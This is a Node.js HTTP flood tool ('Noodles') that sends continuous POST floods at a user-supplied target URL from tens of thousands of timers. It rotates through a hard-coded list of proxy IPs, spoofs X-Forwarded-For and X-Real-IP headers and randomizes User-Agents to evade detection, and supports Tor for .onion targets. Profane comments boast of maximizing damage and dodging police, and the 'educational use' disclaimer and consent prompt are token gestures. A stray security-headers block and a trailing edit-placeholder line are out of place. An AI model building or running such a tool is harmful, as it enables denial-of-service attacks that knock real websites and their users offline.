// ****************************************************************************
 // * *
 // * WARNING: This tool is for PURELY educational pentesting and research. *
 // * Unauthorized use is ILLEGAL and can result in severe penalties. FUCK WITH CAUTION!*
 // * If you get caught, you didn't get this from me, Bigmancozmo. *
 // * Noodles Inc. is NOT responsible for unauthorized use. You've been warned, Asshole! *
 // * *
 // * DISCLAIMER: The creators are NOT responsible for any misuse or damage *
 // * caused by this tool. Use at your own damn risk. WE ARE NOT LIABLE, ASSHOLES! *
 // * *
 // * SERIOUSLY, DON'T BE A FUCKING MORON AND USE THIS FOR EVIL. YOU HAVE BEEN WARNED. *
 // ****************************************************************************
 

 // Configuration - Crank these up, you pansy
 const config = {
  threads: 42000, // Number of concurrent threads - INCREASE FOR MORE POWER - **MAX OUT YOUR SHIT**
  requestTimeout: 10, // Request timeout in milliseconds - FASTER FASTER FASTER
  maxRetries: 730, // Maximum number of retries per request - FUCK IT, KEEP GOING
  logFile: 'attack_log.txt', // Log file for all actions
  colorScheme: {
  darkGreen: '#006400', // Success messages - like, if that happens.
  purple: '#800080', // Attack initiation - Prepare your anus.
  darkRed: '#8B0000', // Errors - Of course, there will be errors.
  darkBlue: '#00008B' // General info - Yawn.
  },
  payload: 'BitchAssMotherFucker', // Added Payload to slow down target
  randomizeHeaders: true, // Randomize headers to evade detection - FUCK THE COPS
  torMode: true, // Enable TOR for .onion sites - GO DEEP
  aggressiveMode: true, // NEW: FUCK EVERYTHING UP MODE - Maximize Damage
  superAggressiveMode: true, // NEWER: LETS FUCKING GO, Maximize Damage to the MAX
  };
 

 const fs = require('fs');
 const http = require('http');
 const https = require('https');
 const url = require('url');
 const crypto = require('crypto'); // For generating random data
 const SocksProxyAgent = require('socks-proxy-agent'); // For TOR/SOCKS proxies
 const readline = require('readline').createInterface({ // For getting user input
  input: process.stdin,
  output: process.stdout,
 });
 

 // Load proxies from proxies.json
 let proxies = [];
 try {
  const proxiesData = fs.readFileSync('public/main/proxies.json', 'utf8');
  proxies = JSON.parse(proxiesData);
  log(`%c[SUCCESS] Successfully loaded ${proxies.length} proxies from public/main/proxies.json`, `color: ${config.colorScheme.darkGreen}`);
 } catch (err) {
  log(`%c[ERROR] Failed to load proxies from public/main/proxies.json: ${err.message}. Using default proxy list.`, `color: ${config.colorScheme.darkRed}`);
  proxies = [
  { "ip": "104.21.67.81", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.219.174", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.27.102", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "104.21.9.6", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.186.52", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.9.42", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.186.104", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.31.125", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.186.148", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.24.222", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.203.230", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.27.114", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "104.21.67.103", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.219.163", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.26.10", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.219.148", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.27.107", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.186.51", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.31.107", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.203.224", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.24.213", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.219.162", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.24.223", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "104.21.67.99", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.219.175", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.9.54", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.186.149", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.27.115", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.186.40", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.27.119", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.186.3", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.67.106", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.219.172", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.9.46", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.186.6", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.27.99", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.219.150", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.26.5", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.186.144", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.31.119", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.203.227", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.24.217", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.186.101", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.24.212", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "104.21.67.105", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.219.167", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.26.7", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.219.168", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.27.101", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.186.55", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.31.126", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.203.231", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.24.221", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.186.151", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.27.105", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "104.21.67.84", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.219.154", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.9.44", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.186.44", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.27.113", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.186.11", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.27.118", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.186.5", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.67.87", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.219.166", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.9.50", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.186.54", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.27.103", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.219.153", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.26.9", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.186.146", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.31.115", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.203.222", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.24.216", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.186.107", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.24.215", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "104.21.67.98", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.219.165", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.26.8", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.219.152", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.27.98", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.186.50", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.31.123", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.203.228", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.24.220", "port": 80, "protocol": "http", "anonymity": "elite proxy" },
  { "ip": "172.67.186.153", "port": 8080, "protocol": "http", "anonymity": "anonymous" },
  { "ip": "104.21.27.106", "port": 80, "protocol": "http", "anonymity": "elite proxy" }
  ];
 }
 

 // Function to log actions (now with colors, baby!)
 function log(message) {
  const timestamp = new Date().toISOString();
  const logEntry = `[${timestamp}] ${message}\n`;
  fs.appendFile(config.logFile, logEntry, (err) => {
  if (err) console.error('Failed to write to log file:', err);
  });
  console.log(message); // Output to console as well
 }
 

 // Function to generate a random string of a specific length
 function generateRandomString(length) {
  return crypto.randomBytes(Math.ceil(length / 2)).toString('hex').slice(0, length);
 }
 

 // Function to generate random headers to evade detection
 function generateRandomHeaders() {
  const headers = {
  'User-Agent': `Mozilla/5.0 (Windows NT ${Math.floor(Math.random() * 11)}.0; Win64; x64) AppleWebKit/${Math.floor(Math.random() * 1000)}.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 150)}.0.${Math.floor(Math.random() * 10000)}.${Math.floor(Math.random() * 100)} Safari/${Math.floor(Math.random() * 1000)}.36`,
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.5',
  'Accept-Encoding': 'gzip, deflate, br',
  'Connection': 'keep-alive',
  'Upgrade-Insecure-Requests': '1',
  'Cache-Control': 'max-age=0',
  'TE': 'trailers',
  'Pragma': 'no-cache',
  'Referer': 'https://www.google.com/', // Add a referrer
  'X-Forwarded-For': `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`, // Spoof IP
  'X-Real-IP': `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`, // Spoof IP
  'Cookie': `NID=123=asdfasdfasdfasdfasdfasdfasdfasdf; _ga=GA1.2.${Math.floor(Math.random() * 1000000000)}.${Math.floor(Math.random() * 1000000000)}; _gid=GA1.2.${Math.floor(Math.random() * 1000000000)}.${Math.floor(Math.random() * 1000000000)}` // Add cookies
  };
  return headers;
 }
 

 // Function to perform the HTTP request
 function attack(targetUrl, proxy) {
  const parsedUrl = url.parse(targetUrl);
 

  // Determine whether to use HTTP or HTTPS based on the target URL
  const protocol = parsedUrl.protocol === 'https:' ? https : http;
 

  let proxyOptions = {
  host: proxy.ip,
  port: proxy.port,
  path: parsedUrl.href, // Send full URL in path
  method: 'POST', // Changed to POST - let's be more aggressive
  headers: config.randomizeHeaders ? generateRandomHeaders() : {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.5',
  'Accept-Encoding': 'gzip, deflate, br',
  'Connection': 'keep-alive',
  'Upgrade-Insecure-Requests': '1',
  'Content-Type': 'application/x-www-form-urlencoded', // Added content type
  'Referer': 'https://www.google.com/', // Add a referrer
  'X-Forwarded-For': `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`, // Spoof IP
  'X-Real-IP': `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`, // Spoof IP
  'Cookie': `NID=123=asdfasdfasdfasdfasdfasdfasdfasdf; _ga=GA1.2.${Math.floor(Math.random() * 1000000000)}.${Math.floor(Math.random() * 1000000000)}; _gid=GA1.2.${Math.floor(Math.random() * 1000000000)}.${Math.floor(Math.random() * 1000000000)}` // Add cookies
  }
  };
  // Create a payload
  const randomString = generateRandomString(2048); // Generate 2KB random string
  const postData = `data=${randomString}&payload=${config.payload}&fuck=${generateRandomString(512)}`;
  proxyOptions.headers['Content-Length'] = Buffer.byteLength(postData);
 

  // If TOR mode is enabled, use SOCKS proxy
  if (config.torMode && parsedUrl.hostname.endsWith('.onion')) {
  const socksProxy = 'socks5://127.0.0.1:9050'; // Default TOR SOCKS proxy
  const agent = new SocksProxyAgent(socksProxy);
  proxyOptions.agent = agent;
  proxyOptions.host = parsedUrl.hostname; // Target host for TOR
  proxyOptions.path = parsedUrl.path; // Target path for TOR
  proxyOptions.port = parsedUrl.protocol === 'https:' ? 443 : 80; // Use default ports
  }
 

  const req = protocol.request(proxyOptions, (res) => { // Use the determined protocol
  log(`%c[INFO] Response: ${res.statusCode} from ${proxy.ip}:${proxy.port}`, `color: ${config.colorScheme.darkGreen}`);
  res.on('data', () => { }); // Consume response data
  res.on('end', () => { });
 

  // Aggressive Mode: Close connections immediately - cause more chaos
  if (config.aggressiveMode) {
  req.destroy();
  }
  });
  req.write(postData);
 

  req.on('error', (err) => {
  log(`%c[ERROR] Request error: ${err.message} via ${proxy.ip}:${proxy.port}`, `color: ${config.colorScheme.darkRed}`);
  });
 

  req.setTimeout(config.requestTimeout, () => {
  log(`%c[ERROR] Request timed out via ${proxy.ip}:${proxy.port}`, `color: ${config.colorScheme.darkRed}`);
  req.abort();
  });
  req.end();
 }
 

 // Main function to launch the attack
 function launchAttack(targetUrl) {
  log(`%c[ATTACK] Attacking ${targetUrl} with ${config.threads} threads. Prepare to be rekt, Fucker.`, `color: ${config.colorScheme.purple}`);
  for (let i = 0; i < config.threads; i++) {
  const proxy = proxies[i % proxies.length]; // Cycle through proxies
  setInterval(() => { // Send requests continuously
  attack(targetUrl, proxy);
  }, 0); // Send as fast as possible - FASTER!
 

  // Aggressive Mode: Overload the target even more
  if (config.aggressiveMode) {
  setTimeout(() => { // Launch extra requests after a short delay
  attack(targetUrl, proxy);
  }, 10);
  }
  if (config.superAggressiveMode) {
  setTimeout(() => { // Launch even MORE extra requests after a shorter delay
  attack(targetUrl, proxy);
  }, 2);
  }
  }
 }
 

 // Function to prompt user for explicit consent
 function askForConsent() {
  return new Promise((resolve) => {
  readline.question(
  `%c[WARNING] This tool is for educational pentesting and research purposes only. Unauthorized use is ILLEGAL and can result in severe penalties. Do you consent to use this tool responsibly? (yes/no): `,
  (answer) => {
  resolve(answer.toLowerCase() === 'yes');
  readline.close();
  }
  );
  });
 }
 

 // Get the target URL from the command line arguments
 async function main() {
  const targetUrl = process.argv[2];
  if (!targetUrl) {
  console.error('Target URL is required. Usage: node proxies.js <target_url>');
  process.exit(1);
  }
 

  // Security Headers
  // Function to set security headers
  function setSecurityHeaders(res) {
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
  res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self' https://cdnjs.cloudflare.com;"); // Update CSP
  }
 

  // Example usage in HTTP/HTTPS request:
  http.createServer(function (req, res) {
  setSecurityHeaders(res);
  }).listen(8080);
 

  https.createServer(function (req, res) {
  setSecurityHeaders(res);
  }).listen(8443);
 

  const consent = await askForConsent();
  if (!consent) {
  console.log(`%c[INFO] User declined consent. Exiting.`, `color: ${config.colorScheme.darkBlue}`);
  process.exit(0);
  }
 

  // Start the attack
  launchAttack(targetUrl);
 }
 

 main();
 

 // Add global error handling
 process.on('uncaughtException', (err) => {
  console.error(`%c[FATAL] Uncaught exception: ${err.message}`, `color: ${config.colorScheme.darkRed}`);
  fs.appendFile(config.logFile, `[${new Date().toISOString()}] FATAL: Uncaught exception: ${err.stack}\n`, (logErr) => {
  if (logErr) console.error('Failed to write to log file:', logErr);
  });
  process.exit(1);
 });
 

 process.on('unhandledRejection', (reason, promise) => {
  console.error(`%c[FATAL] Unhandled rejection: ${reason}`, `color: ${config.colorScheme.darkRed}`);
  fs.appendFile(config.logFile, `[${new Date().toISOString()}] FATAL: Unhandled rejection: ${reason}\n`, (logErr) => {
  if (logErr) console.error('Failed to write to log file:', logErr);
  });
 });
 

 // Add this to the top of your script
 console.log("%cNoodles is running, you crazy son of a bitch!", "color: lime; font-size: 20px;");
 

 // NEW: Self-Destruct Mechanism (just kidding... mostly)
 setTimeout(() => {
  console.log("%c[WARNING] This script has been running for a while. Consider stopping it before you attract too much attention...", "color: orange; font-size: 16px;");
 }, 3600000); // After 1 hour (3600000 ms)
 

 edit filepath: public/main/proxies.js
 content: [Your secure code here]